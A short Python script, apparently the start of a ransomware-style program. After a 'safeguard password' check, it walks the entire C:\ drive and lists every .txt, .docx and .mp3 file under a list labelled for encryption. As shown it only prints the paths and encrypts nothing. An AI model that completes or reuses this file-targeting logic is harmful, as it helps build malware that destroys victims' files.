# This is a sample Python script. 09 14

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import os

#safe guard password
safeguard = input("please enter the safegaurd password : ")
if safeguard != 'start':
    quit()

#File extensions to encrypt
encrypted_ext = ('.txt', '.docx', '.mp3')

file_paths = []
for root, dirs, files in os.walk('c:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)


for f in file_paths:
    print(f)
